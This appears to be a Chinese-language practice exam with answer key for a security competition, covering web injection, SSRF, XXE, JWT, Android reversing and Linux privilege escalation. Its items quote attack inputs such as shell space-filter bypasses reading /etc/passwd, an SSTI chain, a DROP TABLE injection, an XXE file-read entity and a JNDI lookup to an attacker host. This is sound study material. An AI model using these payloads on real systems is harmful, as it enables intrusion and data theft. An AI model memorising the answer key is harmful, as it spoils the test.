# 🏁 隊員 A 金盾獎初賽考前總衝刺大卷（60 題・實戰深度版）

> **定位**：取代先前所有淺卷，依 [`金盾獎初賽三人分工檢核表.md`](../../../../../金盾獎初賽三人分工檢核表.md) 全範圍重生，深度拉到金盾初賽實戰級。
> **涵蓋**：Web 15 大項（主責）＋ Android/Java 逆向（主責）＋ Misc/網路通識 1/3（分攤）＋ 工具總表辨識（全員必會）。
> **賽制**：單選、答錯不扣分、同分比速度 → **每題必填、不確定先標記**。計算題用紙筆，不心算。
> **用法**：限時 50 分鐘。先遮選項、自己說出「漏洞名＋機制＋防護」再看選項。對完把錯題抄進錯題庫。

---

## 🔴 Part 1 — Web 伺服器端注入（Q1 ~ Q10）

#### Q1.【SQLi 盲注頻寬】
Boolean 盲注中，若要萃取的字元範圍是完整可見 ASCII（約 128 種），採**二分搜尋**法，平均每個字元需幾次請求？若改用**逐位元**（bit-by-bit）法又需幾次？
* (A) 二分約 7 次；逐位元 8 次
* (B) 二分約 128 次；逐位元 128 次
* (C) 二分約 4 次；逐位元 4 次
* (D) 二分約 64 次；逐位元 16 次

#### Q2.【延遲函數跨 DB】
下列「資料庫 — 時間延遲語法」配對，何者**錯誤**？
* (A) MySQL — `SLEEP(5)` / `BENCHMARK(5000000, MD5('a'))`
* (B) PostgreSQL — `pg_sleep(5)`
* (C) MSSQL — `WAITFOR DELAY '0:0:5'`
* (D) Oracle — `SLEEP(5)`

#### Q3.【命令注入空格繞過】
後端對使用者輸入過濾了空白字元 ` `，但仍將其拼入 shell 命令。下列何者**無法**在 Linux bash 下繞過空格限制達成 `cat /etc/passwd`？
* (A) `cat${IFS}/etc/passwd`
* (B) `cat</etc/passwd`
* (C) `{cat,/etc/passwd}`
* (D) `cat%20/etc/passwd`

#### Q4.【命令注入 vs SSTI 判讀】
某 Python Flask 頁面輸入 `{{ ''.__class__.__mro__[1].__subclasses__() }}` 後回傳一長串類別清單。此屬於何種漏洞？攻擊者接下來最可能的目標？
* (A) XSS；竊取 cookie
* (B) SSTI（Jinja2）；透過物件繼承鏈找到可執行系統命令的類別（如 `subprocess.Popen`）達成 RCE
* (C) SQL 注入；列舉資料表
* (D) 反序列化；觸發 gadget chain

#### Q5.【寬字節注入機制】
GBK + `addslashes` 環境下 `%df%27` 能注入成功。關於其位元組層級，下列敘述何者正確？
* (A) `%27`（`'`）被 `addslashes` 轉為 `%5c%27`，而 `%df%5c` 在 GBK 被解讀為一個雙位元組漢字，使 `%5c` 被「吃掉」，`%27` 脫逸
* (B) `%df` URL 解碼後直接等於單引號
* (C) `addslashes` 對 GBK 編碼完全無效、不會加任何斜線
* (D) 必須搭配 UTF-8 連線編碼才會成立

#### Q6.【ORDER BY 與 LIMIT 注入】
排序端點 `... ORDER BY $col`，使用 PreparedStatement 綁定 `$col` 卻拋語法錯誤。最正確的理解與防禦為？
* (A) 驅動 Bug，重啟解決
* (B) SQL 標準中「識別字（欄位 / 表名 / 關鍵字）」不可參數化，只有「值」能綁定；此處須改用**伺服器端白名單映射**
* (C) 預編譯只支援 MySQL
* (D) 改用前端 JS 過濾即可

#### Q7.【UNION 注入先決條件】
`SELECT id, name, price FROM items WHERE id=$id`，欲用 UNION 抽資料，下列何者為**必要**先決條件？
* (A) 必須開啟堆疊查詢（stacked queries）
* (B) UNION 後的欄位**數量**需與原查詢相同、對應位置**資料型態**相容，且查詢結果需被頁面回顯
* (C) 資料庫必須允許遠端 root 登入
* (D) 必須存在 CORS 錯配

#### Q8.【二階注入 Second-Order】
使用者註冊時暱稱 `admin'-- ` 被安全跳脫後存入資料庫；但稍後「修改密碼」功能以該暱稱**重新組 SQL** 時未再跳脫，導致注入。此類型最精確的名稱為？
* (A) 一階反射注入
* (B) 二階注入（Second-Order SQLi）：汙染資料先落庫、於另一處被信任取用時才觸發
* (C) 寬字節注入
* (D) 盲注

#### Q9.【堆疊查詢與批次】
`;` 分隔的堆疊查詢（stacked queries）在何種情境下最常被封鎖，使 `'; DROP TABLE users-- ` 無效？
* (A) 使用 PHP + MySQLi 的 `mysqli_query()`（單語句 API，預設不執行多語句）
* (B) 使用 MSSQL + ADO
* (C) 使用 PostgreSQL
* (D) 任何資料庫都一定支援堆疊查詢

#### Q10.【SQLi 根本防禦】
關於防禦 SQL 注入，下列敘述何者**最正確**？
* (A) 參數化查詢（Prepared Statement）將「程式碼」與「資料」在協定層分離，是根本防禦；對無法參數化的識別字則用白名單
* (B) 只要部署 WAF 攔截 `union`、`select` 即可根治
* (C) `addslashes` 可完全防禦（含寬字節情境）
* (D) 前端 JavaScript 驗證即足夠

---

## 🟠 Part 2 — Web 前端與跨站信任邊界（Q11 ~ Q20）

#### Q11.【XSS 三型判讀】
Payload 存於 URL `#` 後、由前端 `innerHTML` 寫入且**完全不經伺服器**。此為何種 XSS？為何伺服器端 WAF 常攔不到？
* (A) Stored XSS；因資料存於伺服器
* (B) DOM-based XSS；`#` 後的 fragment 不會送到伺服器，故伺服器端過濾/WAF 看不到該 payload
* (C) Reflected XSS；伺服器反射
* (D) Self-XSS；僅自身受影響

#### Q12.【CSP nonce 放行規則】
網站 CSP 為 `script-src 'nonce-R4nd0m' 'strict-dynamic'`。下列敘述何者正確？
* (A) 任何 inline `<script>` 都能執行
* (B) 只有帶正確 `nonce="R4nd0m"` 的 `<script>` 能執行；`strict-dynamic` 允許這些受信任腳本「動態載入」的後續腳本，並使 host 白名單失效
* (C) CSP nonce 可防禦 SQL 注入
* (D) nonce 每次請求都相同，可被預測

#### Q13.【Cookie SameSite 深度】
關於 `SameSite` 屬性，下列敘述何者**錯誤**？
* (A) `SameSite=Strict` 完全禁止 Cookie 在跨站請求中攜帶（連跨站點擊連結導覽也不帶）
* (B) `SameSite=Lax`（現代瀏覽器預設）允許頂層導覽的安全方法（GET）攜帶
* (C) `SameSite=None` 允許所有跨站攜帶，但**必須同時設定 `Secure`**，否則瀏覽器拒絕
* (D) `SameSite=None` 不需要 `Secure` 即可在 HTTP 下生效

#### Q14.【CSRF 成立條件】
下列何者**不是** CSRF 攻擊成立的必要條件？
* (A) 目標操作僅依賴瀏覽器自動攜帶的憑證（Cookie / Basic Auth）辨識身分
* (B) 攻擊者能預測或無需 CSRF Token 等不可預測參數
* (C) 受害者在已登入狀態下觸發惡意請求
* (D) 伺服器必須存在 SQL 注入

#### Q15.【CORS 錯配判定】
伺服器對任意請求都**反射** `Origin` 到 `Access-Control-Allow-Origin` 並附 `Access-Control-Allow-Credentials: true`。關於危害與「具體 Origin + 憑證」的關係，何者正確？
* (A) 帶憑證的 CORS 本來就**必須**指定具體 Origin（不能用 `*`）；問題不在「非萬用字元」，而在**未驗證就反射不可信 Origin**，使任意站可帶受害者 cookie 讀取回應
* (B) 只要不是 `*` 就一定安全
* (C) 瀏覽器會拒絕所有帶憑證的跨源請求
* (D) 此配置可防禦 CSRF

#### Q16.【Cookie 竊取防線】
Session Cookie 設定 `HttpOnly; Secure; SameSite=Lax`。下列敘述何者正確？
* (A) `HttpOnly` 使 `document.cookie` 讀不到它（降低 XSS 竊 session）；`Secure` 僅 HTTPS 傳送；`SameSite=Lax` 降低 CSRF
* (B) `HttpOnly` 可防止 CSRF
* (C) 這些旗標能防止 SQL 注入
* (D) `Secure` 會使 JavaScript 無法讀取 Cookie

#### Q17.【401 vs 403】
使用者已通過身分驗證（已登入），但嘗試存取無權限的資源。伺服器**最語意正確**的回應狀態碼為？
* (A) 401 Unauthorized（代表「未認證」，通常附 `WWW-Authenticate`）
* (B) 403 Forbidden（代表「已認證但無授權」，提供憑證也無濟於事）
* (C) 404 Not Found
* (D) 500 Internal Server Error

#### Q18.【安全回應標頭】
下列「標頭 — 防禦目標」配對，何者**錯誤**？
* (A) `X-Content-Type-Options: nosniff` — 禁止瀏覽器 MIME 嗅探
* (B) `Strict-Transport-Security` — 強制後續以 HTTPS 連線（防降級 / SSL strip）
* (C) `X-Frame-Options: DENY` — 防點擊劫持（禁止被 iframe 嵌入）
* (D) `Content-Security-Policy` — 防禦 SQL 注入

#### Q19.【郵件驗證三支柱】
關於 SPF / DKIM / DMARC，下列敘述何者**錯誤**？
* (A) SPF 以 DNS **TXT** 記錄列出被授權的寄件來源 IP，比對信封寄件者（Return-Path）
* (B) DKIM 以私鑰對郵件標頭/內容簽章，收件方用 DNS 上的公鑰驗證完整性與來源
* (C) DMARC 建立在 SPF / DKIM 的**對齊（alignment）**之上，定義失敗處置（none / quarantine / reject）與回報
* (D) DKIM 會加密整封郵件內容，使中間人無法讀取

#### Q20.【OWASP Top 10 2025】
相較 2021 版，OWASP Top 10 **2025** 新增的兩個類別為？
* (A) Broken Access Control、Cryptographic Failures
* (B) Software Supply Chain Failures、Mishandling of Exceptional Conditions
* (C) Injection、SSRF
* (D) XSS、CSRF

---

## 🟡 Part 3 — Web 架構、語意與深層利用（Q21 ~ Q32）

#### Q21.【SSRF 協定利用】
SSRF 中，攻擊者想用內部 Redis（無密碼、純文字協定）達成寫檔/RCE，最適合的協定為？
* (A) `http://`
* (B) `gopher://`（可構造任意 TCP 位元組流，逐行餵入 Redis 指令）
* (C) `https://`
* (D) `ftp://`

#### Q22.【SSRF 防護繞過：DNS Rebinding】
伺服器在請求前先解析網域、確認 IP 非內網才放行，但仍被打進內網。最可能的手法為？
* (A) DNS Rebinding：第一次解析回公網 IP 通過檢查，TTL 極短，實際連線時再解析回內網 IP（TOCTOU 時間差）
* (B) CORS 反射
* (C) 寬字節注入
* (D) HTTP 走私

#### Q23.【SSRF 打雲端 IMDS】
攻擊者透過 SSRF 存取 `http://169.254.169.254/latest/meta-data/`。最有效的雲端側防護為？
* (A) 關閉伺服器防火牆
* (B) 啟用 IMDSv2（要求帶 token 的 PUT 預先請求 + 限制 hop limit），使單純的 SSRF GET 失效
* (C) 改用 HTTP/2
* (D) 加長 session 逾時

#### Q24.【反序列化觸發點】
下列「語言 — 反序列化危險觸發點」配對，何者**錯誤**？
* (A) PHP — `unserialize()` 觸發 `__wakeup` / `__destruct`（POP chain）
* (B) Python — `pickle.loads()` 觸發 `__reduce__`（回傳可呼叫物件 + 參數）
* (C) Java — `ObjectInputStream.readObject()`（配合 ysoserial gadget）
* (D) JavaScript — `JSON.parse()` 必然導致 RCE

#### Q25.【Log4Shell / JNDI】
Log4Shell（CVE-2021-44228）的核心機制為？
* (A) 緩衝區溢位
* (B) Log4j 對日誌字串執行 `${jndi:ldap://attacker/x}` 的 JNDI 查找，向攻擊者伺服器請求並載入遠端惡意 Java 類別，達成 RCE
* (C) SQL 注入
* (D) XSS

#### Q26.【XXE 實體宣告】
欲透過 XXE 讀取伺服器 `/etc/passwd`，正確的外部實體宣告為？
* (A) `<!ENTITY xxe SYSTEM "file:///etc/passwd">`，再於 XML 內文引用 `&xxe;`
* (B) `<script>fetch('/etc/passwd')</script>`
* (C) `' UNION SELECT load_file('/etc/passwd')-- `
* (D) `{{ '/etc/passwd' | read }}`

#### Q27.【Blind XXE】
當 XML 解析結果不回顯時，Blind XXE 常用何種手法外帶資料？
* (A) 時間盲注
* (B) 透過外部 DTD 定義參數實體，將讀到的檔案內容拼入一個對攻擊者伺服器發起的 OOB 請求（如 HTTP / FTP）
* (C) CORS 反射
* (D) 無法外帶，Blind XXE 不存在

#### Q28.【JWT 演算法混淆】
系統以 RS256 簽發 JWT 但驗證端未鎖演算法。攻擊者改標頭為 `HS256`，以**伺服器公開的 RSA 公鑰字串**作為 HMAC 金鑰重簽，竟通過。根因與防禦為？
* (A) `alg:none`；移除簽章
* (B) 演算法混淆（RS256→HS256）：驗證端把「本應作為非對稱公鑰」的資料當成 HMAC 對稱金鑰；防禦是**伺服器端硬性指定允許的演算法**，不信任 token 自報的 `alg`
* (C) 重放攻擊；加 nonce
* (D) Session Fixation

#### Q29.【JWT 機敏資料】
關於 JWT 的 Payload，下列敘述何者正確？
* (A) JWT Payload 經過強加密，任何人都無法讀取
* (B) JWT 的 Header 與 Payload 僅經 **Base64Url 編碼（非加密）**，任何人可直接解碼讀取，故不應存放機敏明文
* (C) JWT 一定比 session cookie 安全
* (D) 簽章會加密 Payload 內容

#### Q30.【HTTP 請求走私】
前端代理依 `Content-Length`、後端依 `Transfer-Encoding: chunked` 判定請求邊界。此走私類型標記為？另一方向為？
* (A) 本題為 CL.TE；反向（前端 TE、後端 CL）為 TE.CL
* (B) 本題為 TE.CL；反向為 CL.TE
* (C) 兩者皆為 CP（快取投毒）
* (D) 與走私無關

#### Q31.【Web 快取投毒】
Web 快取投毒（Cache Poisoning）成立的關鍵前提為？
* (A) 某個影響回應內容的輸入（如未納入快取鍵的 header）被攻擊者控制，且該回應被快取後服務給其他使用者
* (B) 伺服器開啟了 SQL 堆疊查詢
* (C) 使用了 HTTP/1.0
* (D) Cookie 未設 HttpOnly

#### Q32.【Host 標頭攻擊】
應用在產生「密碼重置連結」時直接信任請求的 `Host`（或 `X-Forwarded-Host`）標頭。攻擊者可達成？
* (A) 密碼重置投毒：重置連結的網域被改成攻擊者站點，受害者點擊後 token 外洩給攻擊者
* (B) 緩衝區溢位
* (C) ARP 欺騙
* (D) 無任何影響

---

## 🟣 Part 4 — 檔案、上傳、路徑與協定（Q33 ~ Q40）

#### Q33.【LFI 與 PHP 包裝器】
PHP LFI 中，欲讀取原始 PHP 原始碼（避免被當成程式執行掉），常用的包裝器為？
* (A) `php://filter/convert.base64-encode/resource=index.php`（以 base64 編碼讀出原始碼）
* (B) `file://execute`
* (C) `http://localhost`
* (D) `data://text/plain`

#### Q34.【路徑穿越編碼繞過】
後端過濾了字面上的 `../`，下列何者**最可能**仍繞過達成路徑穿越？
* (A) `%2e%2e%2f`（URL 編碼的 `../`）或 `....//`（過濾後剩 `../`）
* (B) 把 `../` 改成 `./`
* (C) 加上 `https://`
* (D) 改用 POST 方法

#### Q35.【Apache 多副檔名解析】
在設定了 `AddHandler application/x-httpd-php .php` 的舊 Apache，上傳 `shell.php.jpg` 可能被當 PHP 執行，原因為？
* (A) Apache 由右至左解析副檔名，遇到無法識別的 `.jpg` 會往前回退，命中 `.php` 而交給 PHP 處理器
* (B) `.jpg` 本身會被執行為 PHP
* (C) 檔名含 `shell` 就會執行
* (D) 與副檔名無關

#### Q36.【Nginx alias 目錄穿越】
Nginx 設定 `location /files { alias /var/www/data/; }`（location 無結尾斜線）。攻擊者請求 `/files../` 會讀到？此類問題名稱？
* (A) 讀到 `/var/www/data../` → 即 `/var/www/`，屬 **off-by-slash alias 目錄穿越**
* (B) 無任何效果
* (C) 觸發 SQL 注入
* (D) 僅回 404

#### Q37.【檔案上傳繞過】
下列**不屬於**檔案上傳驗證繞過常見手法的是？
* (A) 偽造 `Content-Type` 為 `image/png`
* (B) 竄改 Magic Bytes 在檔頭偽裝成合法圖片，後段夾帶 PHP
* (C) 利用雙副檔名 / 大小寫 / `.htaccess` / 空字元截斷（舊版）
* (D) 在請求中加入 `SameSite=None`

#### Q38.【Magic Bytes 辨識】
下列「檔案類型 — 檔頭位元組」配對，何者**錯誤**？
* (A) PNG — `89 50 4E 47`
* (B) PDF — `25 50 44 46`（`%PDF`）
* (C) ZIP / docx / apk / jar — `50 4B 03 04`（`PK..`）
* (D) ELF 執行檔 — `4D 5A`（`MZ`）

#### Q39.【ELF vs PE 檔頭】
Linux ELF 執行檔與 Windows PE 執行檔的檔頭魔術位元組分別為？
* (A) ELF：`7F 45 4C 46`（`.ELF`）；PE：`4D 5A`（`MZ`，DOS header）
* (B) ELF：`4D 5A`；PE：`7F 45 4C 46`
* (C) 兩者皆為 `50 4B`
* (D) 兩者皆為 `FF D8 FF`

#### Q40.【開放重定向與 SSRF 串接】
某參數 `?next=https://evil.com` 導致登入後跳轉至外部站。此漏洞名稱，及其常被串接利用的場景？
* (A) 開放重定向（Open Redirect）；常被用於釣魚、OAuth token 竊取、或繞過 SSRF 白名單（先指向可信網域再 302 到內網）
* (B) SQL 注入；拖庫
* (C) 緩衝區溢位；RCE
* (D) XSS；僅前端影響

---

## 🔵 Part 5 — Android / Java 逆向工程（Q41 ~ Q48）

#### Q41.【APK 結構】
關於 APK 內部結構，下列敘述何者**錯誤**？
* (A) APK 本質為 ZIP，可解壓
* (B) `classes.dex` 是 Dalvik/ART 位元碼；`resources.arsc` 是編譯後資源；`lib/` 放各 ABI 的原生 `.so`
* (C) `AndroidManifest.xml` 在 APK 內是**二進位 XML**，需 apktool / aapt 還原為可讀文字
* (D) APK 內的商業邏輯以未編譯的原始 `.java` 檔明文存放

#### Q42.【工具分工】
下列「Android 工具 — 用途」配對，何者**錯誤**？
* (A) jadx — 將 dex 反編譯為近似 Java 原始碼，適合**閱讀**邏輯
* (B) apktool — 反編譯資源與 smali，可修改後 `apktool b` **重新打包**（需再重簽名）
* (C) Frida — 執行期動態插樁，可 hook Java 方法、繞過 root 偵測 / SSL pinning
* (D) jadx — 可直接編輯其輸出並重新編譯回可安裝 APK

#### Q43.【Smali 暫存器與方法】
Smali 中，某非靜態（instance）方法 `.method public check(Ljava/lang/String;)Z`，下列敘述何者正確？
* (A) `p0` 指向 `this`（當前物件），`p1` 為第一個傳入參數（此處的 String）
* (B) `p0` 永遠是第一個參數，與 this 無關
* (C) `v0` 一定代表回傳值
* (D) Smali 沒有暫存器概念

#### Q44.【Smali 控制流】
看這段 smali：
```smali
invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/String;)Z
move-result v1
if-eqz v1, :cond_fail
# ... 成功分支 ...
:cond_fail
```
關於 `if-eqz v1, :cond_fail`，下列何者正確？
* (A) `if-eqz` 在 `v1 == 0`（equals 回傳 false）時跳到 `:cond_fail`；即「比對不相等 → 失敗」
* (B) `if-eqz` 在 `v1 == 1` 時跳轉
* (C) `if-eqz` 是浮點比較
* (D) 這段在建立網路連線

#### Q45.【DEX 與 SO】
關於 `.dex` 與 `.so` 的分析，下列敘述何者正確？
* (A) `.dex` 是 Dalvik 位元碼（Java 層，用 jadx/baksmali）；`.so` 是原生機械碼共享庫（JNI，用 IDA/Ghidra 以 ARM/x86 反組譯）
* (B) `.so` 可用 jadx 反編譯為 Java
* (C) `.dex` 是原生 ARM 機械碼
* (D) 兩者完全相同

#### Q46.【ProGuard 混淆】
關於 ProGuard（及後繼 R8）對 Android 的處理，下列敘述何者**錯誤**？
* (A) 會把類別 / 方法 / 欄位名稱重新命名為 `a`、`b`、`c` 等無意義短名（混淆）
* (B) 具備壓縮（移除未使用程式碼）與優化能力
* (C) 還原混淆前的對應關係需要 `mapping.txt`
* (D) ProGuard 會**加密**所有字串常數，使 jadx 完全看不到明文字串

#### Q47.【逆向工具選擇】
分析者只想**靜態閱讀** APK 的登入驗證邏輯、不重打包、不執行。最有效率的首選為？
* (A) jadx（一鍵 dex → 近似 Java）
* (B) apktool（還要手讀 smali，較費時）
* (C) Frida（需執行 App）
* (D) Wireshark（抓封包）

#### Q48.【Frida 使用情境】
下列何者**最適合**用 Frida 完成？
* (A) 在 App 執行時動態 hook `checkLicense()` 方法、強制其回傳 true，繞過授權檢查
* (B) 靜態閱讀未執行的程式碼
* (C) 將 APK 反編譯為 Java 檔存檔
* (D) 製作磁碟映像

---

## 🟢 Part 6 — 通識：Linux 權限 / Port / 雲端（Q49 ~ Q55）

#### Q49.【Linux 權限數字】
檔案權限 `-rwsr-xr-x`（owner=root）對應的八進位為？`s` 的意義？
* (A) `4755`；`s` 為 SUID（執行時以檔案擁有者 root 身分運行）
* (B) `2755`；`s` 為 SGID
* (C) `1755`；`s` 為 sticky bit
* (D) `0755`；`s` 無特殊意義

#### Q50.【特殊權限位】
下列「特殊權限 — 作用」配對，何者**錯誤**？
* (A) SUID（4000，檔案 owner 執行位顯示 `s`）— 執行時取得**檔案擁有者**權限
* (B) SGID（2000）— 對目錄時，其下新建檔案繼承該目錄的**群組**
* (C) Sticky bit（1000，如 `/tmp`，other 執行位顯示 `t`）— 目錄內**僅檔案擁有者可刪除自己的檔案**
* (D) SUID 對目錄有效，會讓目錄內程式自動提權為 root

#### Q51.【找提權點】
取得低權限 shell 後，欲列出系統上所有具 SUID 位元的檔案，下列何者正確且**不會遺漏**？
* (A) `find / -perm -4000 -type f 2>/dev/null`（`-4000` 代表「含有」該位元即符合）
* (B) `find / -perm 4000`（要求權限位**完全相等**，會漏掉 4755 等）
* (C) `ls -l /`
* (D) `chmod 4000 /bin/sh`

#### Q52.【Linux Capabilities】
相較傳統 SUID「全有全無」的 root 提權，Linux Capabilities 的意義為？用什麼指令列舉？
* (A) 將 root 特權切成細粒度能力（如 `cap_setuid`、`cap_net_raw`）；以 `getcap -r /` 列舉，具 `cap_setuid+ep` 的程式亦可能提權
* (B) Capabilities 等同關閉所有權限
* (C) 以 `chmod +s` 列舉
* (D) 與提權無關

#### Q53.【常用 Port 辨識】
下列「Port — 服務」配對，何者**錯誤**？
* (A) 22 — SSH；23 — Telnet；25 — SMTP
* (B) 53 — DNS；389 — LDAP；445 — SMB
* (C) 3306 — MySQL；3389 — RDP；161 — SNMP
* (D) 443 — FTP；143 — RDP；110 — SSH

#### Q54.【雲端共同責任模型】
在 **IaaS** 模式下，下列何者屬於**客戶（而非雲商）**的責任？
* (A) 實體資料中心安全
* (B) 虛擬化 Hypervisor 維護
* (C) 作業系統修補、應用程式、以及自身資料與存取控制（IAM）
* (D) 底層網路硬體

#### Q55.【共同責任鐵律】
關於 IaaS / PaaS / SaaS 的責任劃分，下列敘述何者**最正確**？
* (A) 不論哪種模式，**資料的分類保護與身分存取管理（IAM）永遠是客戶責任**；越往 SaaS，雲商承擔的 OS / 執行環境 / 應用越多
* (B) SaaS 模式下客戶需負責作業系統修補
* (C) IaaS 模式下雲商負責客戶的應用程式碼安全
* (D) 三種模式客戶責任完全相同

---

## 🟤 Part 7 — Misc 隱寫 / 編碼 + 工具總表（Q56 ~ Q60）

#### Q56.【音訊隱寫】
一段 WAV 音檔，用耳朵聽只有雜訊，但以 Audacity / Sonic Visualiser 開啟**頻譜圖（Spectrogram）**後顯現出文字。此為何種隱寫？
* (A) 頻譜圖隱寫（將訊息畫在聲音的頻率-時間圖上）
* (B) SQL 注入
* (C) LSB 影像隱寫
* (D) EXIF metadata

#### Q57.【壓縮檔分析】
一個 ZIP 檔「偽加密」——標記為加密但其實內容未真正加密。辨識/處理方式為？
* (A) 檢視檔案中的加密旗標位元（如本機檔頭 general purpose bit flag）是否與實際一致，必要時將旗標改回 0 即可正常解壓
* (B) 一定要暴力破解密碼
* (C) ZIP 無法分析
* (D) 改副檔名為 .rar 即可

#### Q58.【圖片隱寫工具】
下列「工具 — 用途」配對，何者**錯誤**？
* (A) `zsteg` — 偵測 PNG / BMP 的 LSB 隱寫
* (B) `exiftool` — 讀取圖片 EXIF / metadata
* (C) `binwalk` — 偵測並抽出檔案中夾帶的其他檔案（carving）
* (D) `steghide` — 專門用來反編譯 APK

#### Q59.【工具總表誘答 — 挑出不同類】
下列工具中，**唯一不是**「目錄 / 檔案暴力掃描 / fuzzing」用途的是？
* (A) gobuster
* (B) dirsearch
* (C) ffuf
* (D) gflags

#### Q60.【工具總表誘答 — 用途辨識】
下列「工具 — 用途」配對，何者**錯誤**？
* (A) Volatility 3 — 記憶體轉儲分析（pslist / psscan / malfind）
* (B) 1768.py — 從記憶體抽出 Cobalt Strike 設定檔
* (C) Hollow Hunter — 偵測 process hollowing（程序掉空）
* (D) Detect It Easy（DIE）— 自動化 SQL 注入工具

---
---

## ✅ 答案總表

| Q1 | Q2 | Q3 | Q4 | Q5 | Q6 | Q7 | Q8 | Q9 | Q10 |
|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
| A | D | D | B | A | B | B | B | A | A |

| Q11 | Q12 | Q13 | Q14 | Q15 | Q16 | Q17 | Q18 | Q19 | Q20 |
|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
| B | B | D | D | A | A | B | D | D | B |

| Q21 | Q22 | Q23 | Q24 | Q25 | Q26 | Q27 | Q28 | Q29 | Q30 |
|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
| B | A | B | D | B | A | B | B | B | A |

| Q31 | Q32 | Q33 | Q34 | Q35 | Q36 | Q37 | Q38 | Q39 | Q40 |
|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
| A | A | A | A | A | A | D | D | A | A |

| Q41 | Q42 | Q43 | Q44 | Q45 | Q46 | Q47 | Q48 | Q49 | Q50 |
|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
| D | D | A | A | A | D | A | A | A | D |

| Q51 | Q52 | Q53 | Q54 | Q55 | Q56 | Q57 | Q58 | Q59 | Q60 |
|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
| A | A | D | C | A | A | A | D | D | D |

> 分布：A×30、B×18、C×2、D×10（刻意不均，杜絕「位置猜答」）。**務必從證據/機制說理由，不是對位置。**

---

## 📝 逐題詳解（含誘答分析）

**Q1 ─ A**：128 種可能 → 二分搜尋 log₂128 = **7 次**；逐位元則固定 **8 bit = 8 次**。二分對大字集較省，逐位元穩定但次數略多。
**Q2 ─ D**：Oracle 無 `SLEEP()`，其時間延遲常用 `dbms_pipe.receive_message()` 或 `DBMS_LOCK.SLEEP`。四大 DB 延遲函數必背。
**Q3 ─ D**：`%20` 是 **URL 編碼的空格**，拼進 shell 時仍是空格、會被過濾擋下。`${IFS}`（內部欄位分隔符）、`<`（重定向）、`{cat,/etc/passwd}`（brace 展開以逗號代空格）才是真正的 shell 層繞過。
**Q4 ─ B**：`__class__.__mro__.__subclasses__()` 是 Jinja2 **SSTI** 經典沙箱逃逸鏈，目的是從物件繼承樹找到能執行命令的類別（`subprocess.Popen` / `os` 等）達成 RCE。
**Q5 ─ A**：核心是「**反斜線 `0x5c` 被 GBK 併入雙位元組漢字而消失**」，不是 `%df` 等於引號（B 是誘答）。且必須是**寬字元編碼（GBK）**，UTF-8 不成立（D 錯）。
**Q6 ─ B**：識別字不可參數化，只有「值」能綁 `?`。排序欄位須白名單映射。
**Q7 ─ B**：UNION 要「欄位數相同 + 型態相容 + 結果能回顯」。堆疊查詢、遠端 root、CORS 皆非必要（誘答）。
**Q8 ─ B**：汙染資料先安全落庫、在另一處被信任重用時才觸發 = **二階注入**。
**Q9 ─ A**：PHP 的 `mysqli_query()` 是單語句 API，預設不執行以 `;` 分隔的多語句，故堆疊查詢常在此情境失效。
**Q10 ─ A**：根本防禦 = 協定層分離程式碼與資料（參數化）+ 識別字白名單。WAF / addslashes / 前端驗證皆可繞（經典誘答）。

**Q11 ─ B**：fragment（`#` 後）不送伺服器 → 伺服器端 WAF 看不到 → **DOM XSS**。
**Q12 ─ B**：nonce-CSP 只放行帶相同 nonce 的 script；`strict-dynamic` 讓受信任腳本可再動態載入子腳本、並使 host 白名單失效。nonce 每請求應隨機不可預測。
**Q13 ─ D**：**錯的是 D**——`SameSite=None` **必須**搭配 `Secure`，否則現代瀏覽器直接拒絕該 Cookie。A/B/C 皆正確。
**Q14 ─ D**：CSRF 與 SQL 注入無關。必要條件是「靠自動攜帶憑證辨識 + 無不可預測 token + 受害者已登入」。
**Q15 ─ A**：帶憑證的 CORS 本就**必須**用具體 Origin（規範禁止 `*`+credentials）；漏洞在「**未驗證就反射不可信 Origin**」，不在「非萬用字元」。（這題專治把「有指定具體 Origin」誤當安全的盲點。）
**Q16 ─ A**：三旗標分工——HttpOnly 防 JS 讀（抗 XSS 竊 session）、Secure 限 HTTPS、SameSite 抗 CSRF。
**Q17 ─ B**：**已認證、無授權 → 403**；401 是「未認證」。這是高頻語意題。
**Q18 ─ D**：CSP 防的是 XSS / 資源載入，**不防 SQL 注入**。A/B/C 配對正確。
**Q19 ─ D**：**錯的是 D**——DKIM 是**簽章（完整性 + 來源驗證）**，**不加密**郵件內容。SPF=TXT 列授權 IP、DMARC=對齊 + 處置策略。
**Q20 ─ B**：2025 兩大新增 = Software Supply Chain Failures、Mishandling of Exceptional Conditions。

**Q21 ─ B**：`gopher://` 可構造任意 TCP 位元組流，逐行餵 Redis 指令（寫 webshell / crontab），是 SSRF 打內網服務的利器。
**Q22 ─ A**：解析時過檢查、連線時再解析到內網 = **DNS Rebinding**（TOCTOU 時間差）。
**Q23 ─ B**：**IMDSv2**（需 token 的 PUT + hop limit）使單純 SSRF GET 取不到憑證。
**Q24 ─ D**：**錯的是 D**——`JSON.parse()` 只解析資料、不實例化任意物件，不會「必然 RCE」。A/B/C 皆為真實觸發點。
**Q25 ─ B**：Log4Shell = 日誌字串觸發 `${jndi:ldap://...}` → 遠端載入惡意 Java 類別 → RCE。
**Q26 ─ A**：`<!ENTITY xxe SYSTEM "file:///etc/passwd">` + `&xxe;` 引用。
**Q27 ─ B**：Blind XXE 用外部 DTD + 參數實體，把檔案內容拼進對攻擊者伺服器的 OOB 請求外帶。
**Q28 ─ B**：RS256→HS256 演算法混淆；防禦是伺服器端硬指定 `alg`，不信 token 自報。
**Q29 ─ B**：JWT Header/Payload 只是 **Base64Url 編碼非加密**，任何人可解，勿放機敏明文。
**Q30 ─ A**：前 CL 後 TE = **CL.TE**；反向為 TE.CL。
**Q31 ─ A**：可控且影響回應的輸入（如未納快取鍵的 header）+ 回應被快取供他人 = 快取投毒。
**Q32 ─ A**：信任 Host / X-Forwarded-Host 產生重置連結 → 密碼重置投毒、token 外洩。

**Q33 ─ A**：`php://filter/convert.base64-encode/resource=` 以 base64 讀出原始碼、避免被當 PHP 執行。
**Q34 ─ A**：`%2e%2e%2f`（編碼 `../`）或 `....//`（過濾一次 `../` 後剩 `../`）可繞過字面過濾。
**Q35 ─ A**：舊 Apache 由右至左解析副檔名，`.jpg` 不識別則回退命中 `.php` → 交 PHP 執行。
